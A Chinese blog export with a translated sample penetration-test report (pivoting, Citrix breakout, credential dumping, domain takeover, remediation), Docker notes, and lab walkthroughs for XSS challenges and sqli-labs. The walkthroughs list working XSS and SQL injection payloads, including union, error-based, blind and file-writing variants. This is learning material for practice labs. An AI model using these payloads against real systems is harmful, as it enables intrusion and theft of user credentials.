另外，当尝试连接攻击者的在80端口上的SSH服务器时，发现网络协议强制执行。我们创建了一个隧道来避开过滤，这个隧道有个运行的meterpreter会话，允许获取攻击者分享的文件。用这个会话在受损主机上用本地管理员权限运行windows SHELL。在这个shell里，执行一段额外的meterpreter关键代码。 Figure 21-通过最初的meterpreter会话建立端口转发， 可以直接访问受损主机 Figure 22-用这个新建立的连接来获得主机的shell Figure 23-在10.7.0.22上用本地管理员权限建立一个meterpreter shell 有了这个meterpreter shell，就可以利用HTTP-Tunnel，这是一个开源程序，（http://http-tunnel.sourceforge.net/）去封装HTTP负载内的任意流量。比如封装攻击者和主机的远程桌面连接数据。这之后，我们就可以得到完整的访问方式，而不仅仅是命令行。远程桌面连接是用“mike“这个用户的密码创建的，”mike“的密码就是之前从SQLite Manager发现的。详情请看附录A。 Figure 24-通过http隧道屏蔽过滤协议，建立远程桌面连接 此时，MefaCorp One的网络已被完全攻陷，如图25所示。我们能够以控制台的权限访问一台Megacorp One信任的电脑。只是访问受限，因为是靠一个无特权的域用户，和一个本地管理员账户。 Figure 25-到达管理员子网 Citrix环境下的漏洞我们用远程桌面访问方式进入内部网络，继续扫描以发现有价值的目标。找到了一个Citrix的服务器，在受损主机上它被设置成主页。使用和建立远程桌面连接相同的证书，成功登录Citrix。 Figure 26-发现一台支持ie的Citrix服务器 此Citrix环境说明“ie“是唯一可使用的程序。这种做法被很多组织采用来限制进入Citrix服务器底层的操作系统。但是有很多的方法可以绕过限制。这里，我们用”Save“这个对话框生成一个批处理文件，其能让我们使用Powershell。 这样做可能成功，因为“Save”对话框的操作方式大致相同，都是“Windows Explorer”的文件管理窗口。 Figure 27-使用Save对话框有可能突破Citrix环境下的限制 Figure 28-在Citrix上创建有Powershell程序的批处理文件 Figure 29-执行Pwershell突破Citrix的限制 Powershell也可以用来下载恶意的代码，这些代码创建底层服务器的meterpreter会话。 Figure 30-Powershell允许终端用户接受任意源的文件，包括远程网络地址 利用Save对话框运行任意可执行的代码，可以和之前的发现结合在一起，之前发现了本地账户密码，可以以管理员的权限执行程序。这就取得了这个系统的完整的管理员控制权。详情请看附录A。 Figure 31-攻击者利用管理员密码以管理员权限执行恶意代码 Figure 32-完成Citrix服务器的完全控制 Figure 33-在管理员内网中添加了一台主机 升级为域管理员有了这台受损Citrix服务器，我们试着在内存中搜索密码。Citrix服务器是这种攻击了的理想的候选，因为可以操作很长时间，而不用重启还有为大量用户提供服务。 我们用Windows Credential Editor这个工具来得到内存中的密码，因为它可以运行在64位的系统上且不会产生错误。 Figure 34-用Windows Credentials Editor得到服务器上的明文密码 这个工具爆出了很多的密码，包括Windows域管理员的密码。详情请看附录A。为了使恢复出来的凭证有效，我们用域管理员权限创建新的远程桌面连接会话。 Figure 35-域管理员证书有效此时，可以控制整个Windows域了。一个恶意攻击者有许多的工具可以用，包括： 在Windows系统上利用组策略上传后门程序。 对任何使用Windows身份验证的系统上存储的所有数据进行排除。 销毁任何以及所有网络资源。 有目的性的攻击MegaCorp One任一职员，通过信息收集工具，例如可以辨认个人信息的keystroke loggers 泄露对MegaCorp One信任的伙伴或支持组织的系统进入方式，便可以展开攻击 可以确定，这些步骤是可行的，且可以在当前环境之外使用。很明显，已经攻陷了整个MegaCorp One域，本地所有系统已经失去了一体性。 Figure 36-攻陷域 总论MegaCorp One有一系列的配置错误，而使关键公司资产泄露。如果一个恶意的组织利用这些错误，会产生恶劣的影响。现有的关于密码重用，上传控制的策略还不完善，不能消除漏洞发现产生的影响。 这次渗透测试的具体目标如下： 确认远程攻击者能否攻破MegaCorp One的防御系统 确定安全漏洞的影响： 组织信息的机密性 MegaCorp One信息系统的内部基础结构和可用性 这次渗透测试完成了这些目标。一次攻击就可以获得所有的联合资产。许多被认为是小事的问题会被一起利用，造成了系统的沦陷。值得注意的是，整个Megacorp One安全基础设施的崩溃很大程度上归因于对网络边界和主机级别的访问控制不足。需要引进有效的网络分层系统以减轻因整个Megacorp One基础设施的级联安全故障所产生的影响。 建议因为这次渗透暴露了整个系统架构，所以合适的资源分配可以确保修补工作可在短时间内完成。虽然需要修复的漏洞的完整表单不会提供，但一些高危漏洞需要说明。 安全建议如下： 确保组织的任何地方都使用了强凭证。在系统的不同安全层级上使用弱密码和相同的密码，会使攻击更加容易。可以参考NIST SP 800-11（http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdf）来制定企业的密码条款。虽然这个问题存在不广，但仍然是个问题，需要解决。 建立信任带。在内网中合适的地方建立信任逻辑边界。每个逻辑信任部分应相互联合，不能轻易破坏而连上其他部分。所以要使用不同的管理员账号，这样某一部分受损了，但不会影响到其他部分。 在所有系统中实行变更控制：在不同的系统中都发现了配置错误和上传漏洞。通过变更控制可减轻这些漏洞带来的风险。 实施补丁管理程序：按照NIST SP 800-40（http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdf）来创建一个补丁管理程序，这对可持续的安全环境来说是一个重要组件。这将有助于限制由于未修补而导致的攻击。 施行常规漏洞评估。作为有效组织风险管理策略的一部分，漏洞评估要在常规部分执行。这有助于组织确定安全控制是否正确配置，操作是否如预期般执行，是否生成了想要的结果。参照NIST SP 800-30（http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201）建立高效的风险管理系统。风险等级对MegaCorp One风险评定的结果为高。外部攻击者可以获得整个系统的控制权。有理由相信一个恶意的组织能够施行有效的目标攻击。 附录A：漏洞细节及减轻危害风险等级范围鉴于NIST SP 800-30，漏洞按照相似性及影响排列。默认的或弱的凭证级别：高描述：一个公共管理界面仅靠一个弱密钥保护。影响：仅靠暴力破解，就可能爆出SQLite Manager服务的管理员密码。因为缺少额外的授权凭证，这也可能爆出所有用户密码哈希值。如果密码会重用，那么爆出明文密码可以进一步攻击目标系统。修复：确保所有的管理界面受强密码或口令保护。避免使用普通的或和业务相关的密码，因为可以很容易通过字典生成。 密码重用级别：高描述：“mike“在SQLite Manager和个人计算机上用了相同的密码。影响：重复用相同的密码是一个非常差的习惯，应该尽量避免。这个漏洞的影响很恶劣，因为外部攻击者直接获得了内网计算机的有效凭证。这可能暴露更多的可攻击的界面。修复：升级密码管理策略，所有隔离服务强制使用复杂的，不同的密码。密码管理系统要使雇员方便的使用不同的密码进入不同的系统。 共享本地管理员密码级别：高描述：多台主机使用了相同的本地管理员密码。影响：MegaCorp One使用组策略来设置GPO内所有主机的本地管理员密码。结果，攻击者就可以利用著名的攻击工具“PASS-THE-HASH“来攻击，登录所有使用相同密码及相同密码哈希值的主机。如此，攻击者不用破译密码哈希值，大大增加了安全风险。修复：强烈建议禁止使用本地管理员账户。实在要用的话，应分配一个不同的名字及复杂随机的密码。 补丁管理级别：高描述：MegaCorp One内外部环境中有许多未打补丁的系统和程序。影响：弱授权机制和未打补丁的主机，都包含可以用爆破的漏洞，这会使得攻击者以未授权的方式得到大量的公司资产。特别地，例如SQLiite Manager包含远程执行代码的漏洞，底层主机也有一个本地提权的漏洞，这些可以使对外开放的主机轻易地被攻陷。表明了补丁管理策略以及强制执行的不足。修复：所有的公司资产都要及时打上供应商提供的补丁。要完成这些可以使用供应商官方工具或者第三方程序，这些都能检查出未应用的补丁。在许多例子中，第三方工具也可以用来在一个混乱的环境中进行补丁部署。 DNS区域传送级别：低描述：一个错误配置的DNS服务器允许无限制的区域传送。影响：一个配置成可与任何DNS服务器传输数据的DNS服务器，会泄露关于公司资产和网络布局等敏感信息。修复：DNS区域传送需仅对已证明的服务器开放。 默认APACHE文件目录级别：低描述：在admin.megacorpone.com主机上发现了默认的Apache文件目录。影响：攻击者通过检查默认文件夹可能猜出Apache服务器的版本。敏感信息也可能泄露。修复：移除公开网站的所有默认文件。 附录B:关于Offensive SecurityOffensive Security提倡黑盒渗透测试而反对白盒渗透测试。白盒渗透测试近几年来很火，因为在仅要实现常规需求的地方，简化了评估方法。其作为漏洞扫描方法，会有选择的确认发现的问题。这让服务供应商有能力扩大工作量，因为使用了自动化的工具，并且通过证书维持产品间的联动。黑盒是在受控环境下的攻击模拟形式，非常接近现实环境，组织会时不时的面临攻击。黑盒测试是基于目标的评估方法，不仅仅是发现一个简单的漏洞，而是提供一个漏洞真正的商业影响。黑盒测试会找到那些修复后能带来最高商业回报的区域。黑盒测试通常需要很高的专业知识。正如报告中显示的那样，Offensive Security坚信当进行黑盒测试时输出正确有效的结果是检验合格的唯一方式，因为我们专业的安全团队运用了很高专业知识。Offensive Security会集中力量进行渗透测试或着其他参与的项目。这意味着无论什么都参与到提供服务中，例如标准工具Kali Linux，畅销书的作者，O-day漏洞的发现者，或是如Exploit-DB的维护者。Offensive Security提供的产品与市场需求不配对。然而，我们不会适合任一工作。Offensive Security特别提供咨询服务，底容量和高质量的比例使得员工能更接近的模拟现实世界的攻击。这也允许在保持成本合理的同时，客户可以更多地获得行业认可的专业知识。例如，大批量/快速周转服务通常不适合我们。Offensive Security专注与领导高质量，高影响的评估活动，积极地寻求其他供应商无法提供服务的客户。请通过info@offsec.com联系我们。","categories":[],"tags":[{"name":"penetation test","slug":"penetation-test","permalink":"http://finsenty54.github.io/tags/penetation-test/"}]},{"title":"Docker学习笔记","slug":"Docker学习笔记","date":"2019-03-15T19:36:58.000Z","updated":"2019-04-25T03:19:35.188Z","comments":true,"path":"2019/03/16/Docker学习笔记/","link":"","permalink":"http://finsenty54.github.io/2019/03/16/Docker学习笔记/","excerpt":"","text":"sudo add-apt-repository \\ “deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable” https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/ 配置完镜像源后，记得重启 /bin/sh/bin/bash运行shell docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7 docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) docker rm docker ps -a -q docker rmi docker images -q docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5 mysql.connecter 查询后面带一个， -u “http://192.168.160.1/sqltest/post.php&quot; –forms docker run -d -p 4000:80 –link mysql:mysql –name http6 finsenty/http5 docker build -t finsenty/http5 .","categories":[],"tags":[]},{"title":"XSS 20关挑战","slug":"xss","date":"2019-03-01T22:22:42.000Z","updated":"2019-03-27T10:16:05.397Z","comments":true,"path":"2019/03/02/xss/","link":"","permalink":"http://finsenty54.github.io/2019/03/02/xss/","excerpt":"","text":"level1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert = function()echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;没有过滤直接调用函数就可以通关&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。 less2利用页面元素看到输入在&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;闭合input语句即可1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot; less3查看页面元素&lt;input name=keyword value=&#39;1&#39;&gt;在input语句里尝试闭合无用查看源码str都加上了htmlspecialchars函数，但默认配置是不过滤单引号的&#39;onmouseover=&#39;window.alert()即可 输入&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;输入&#39;&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;输入&#39;onclick&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;输入onclick= &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt; less4输入&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;查看可知&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;过滤了&lt; &gt;利用上节方法&quot;onclick=&quot;alert() 更新于2019-03-03 11:19:50 星期日 less5试过后发现onclick变为o_nclickscript变为sc_ript使用&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt; less6onclick script href输入后都进行了变化&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;keyword=&quot;ONclick=&quot;alert()keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;进行大小写替换可以 less7script被过滤，改变大小写也没有用on被过滤href同样如此keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;利用双写绕过 更新于2019-03-06 21:20:39 星期三 less8这题可以添加链接直接使用javascript:alert(1)但并没有用，查看源码$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);被替换了使用制表符绕过%09keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接 less9上题结果没有用，查看源码if(false===strpos($str7,&#39;http://&#39;))知一定要有http://在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的javasc%09ript%3Aalert%281%29//http://www.test.com less10查看页面元素有几个隐藏的值，注入点就在这keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert() 更新于2019-03-27 18:15:42 星期三","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://finsenty54.github.io/tags/xss/"}]},{"title":"sqli-labs(less-1__less-22)","slug":"sqli-labs","date":"2019-02-26T17:01:08.000Z","updated":"2019-03-13T12:28:08.474Z","comments":true,"path":"2019/02/27/sqli-labs/","link":"","permalink":"http://finsenty54.github.io/2019/02/27/sqli-labs/","excerpt":"","text":"闭合有&#39; &quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata 在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &quot;&lt;br&gt;&quot;; 表示换行 ?id=1&#39; and 1=1 --+ 没有报错，返回正确结果 ?id=10&#39; 报错 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1 ?id=1&#39; and 1=2 --+ 没有正确结果经过这三个步骤说明是字符型注入 使用order by来判断有几个字段?id=1&#39; order by 4--+报错Unknown column &#39;4&#39; in &#39;order clause&#39;说明有3个字段 LIMIT 0,1 表示结果只显示一行?id=-1&#39; union select 1,2,3 --+ 看哪个字段可以回显 ?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+得到版本，用户，当前数据库，数据路径concat_ws 带分隔符的链接 ?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+得到当前库的表名?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+查看数据库名信息group_concat 行转列 ?id=-1 &#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;), 3 --+users 表的列名 ?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+得出账户密码 Less-2 ?id=1&#39;报错 ?id=1 and 1=1正确 ?id=1 and 1=2错误可知是数字型注入解题与第一题类似，不再赘述 Less-3查看源码可知，用()加在了id两边，所以只要将()闭合就行了?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+ Less-4查看源码，id两边加了”,用?id=-1&quot;)闭合 Less-5双注入 Rand() //随机函数 Floor() //取整函数 Count() //汇总函数 Group by clause //分组语句 https://blog.csdn.net/Leep0rt/article/details/78556440 ?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+select 查询列数要相同，否则报错 ?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+用group_concat会报错，使用limit 更新于2019-03-01 22:21:15 星期五 Less-6尝试注入后可知是用&quot;闭合，字符串型其他和上题一致?id=1&quot; union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ 更新于2019-03-03 11:48:51 星期日 Lss-7利用outfile文件一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限需要在指定的目录下进行数据的导出。需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖 secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。 如果这个参数为空，这个变量没有效果。 如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它. 如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。 @@datadir 读取数据库路径@@basedir MYSQL 获取安装路径 在Mysql中，需要注意路径转义的问题，即用\\分隔。 https://www.jianshu.com/p/7b9256de20d1 经过测试，用&#39;)) 来闭合 ?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\4.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\5.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\6.txt&quot; --+ Less-8盲注布尔注入当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。 exists（）用于检查 子查询是否有返回数据。 结果是 ture或者false ascii（）把字符转化成ascii码 substr（）substr（string string，num start，num length）；偏移从1开始的 并不是0； DISTINCT 去重复?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+ ?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+ ?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+ ?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+ ?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+ select database() 作为一个语句加括号用脚本来跑 更新于2019-03-04 23:09:10 星期一 Less-9盲注基于时间if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3 ?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+ 利用页面返回时间判断对错例如?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+ Less-10与上题相同，不过利用&quot;进行闭合 更新于2019-03-06 20:29:31 星期三 Less-11GET - 从指定的资源请求数据。 POST - 向指定的资源提交要被处理的数据 输入&#39;报错，知用&#39;闭合uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit可以直接爆出来其他相同uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit Less-12实验可知用&quot;)闭合其他相同 Less-13实验知用&#39;) 闭合其他相同，例如 uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit Less-14实验知用&quot;闭合其他和上题相同 Less-15实验知用&#39;闭合但没用报错信息所以使用时间或布尔注入uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit Less-16实验知用&quot;闭合其他和上题相同 Less-17在uname中注入，都没有反应在password中注入，也没有反应后知先验证用户名正确后，才执行password updatexml()uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit 其他相同 Less-18使用正确账号密码后，页面显示user-agent，则可以在这上面注入 1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;11&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1其他相同HTTP 请求头中除了 User-Agent可能存在sql注入意外，还有referer、X-Forwarded-For可能存在sql注入。 更新于2019-03-10 22:43:03 星期日 Less-19参考上题输入正确用户和密码后，跳出页面 差不多知道在referer上注入&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1不能用#注释，因为后面还有语句存在 &#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1 更新于2019-03-10 22:43:03 星期日 Less-20由题目知注入点在Cookie中 这里我犯了个错误，由于没有拦截，修改Cookie后，直接点刷新不会出结果，需要重新载入页面 输入&#39;报错存在注入点 接下来可以用第一题用的&#39; union select 1,2,database()# &#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()# 也可以用报错注入&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))# Less-21查看CookieYWRtaW4进行解密，知是用base64加密的admin所以只要将上题内容加密即可 Less-22查看cookieadmin&#39; and 1=1 #没有查询结果admin&quot; and 1=1 #结果正确知是用&quot;闭合其他方法与前题相同 更新于2019-03-13 20:26:48 星期三","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]}]}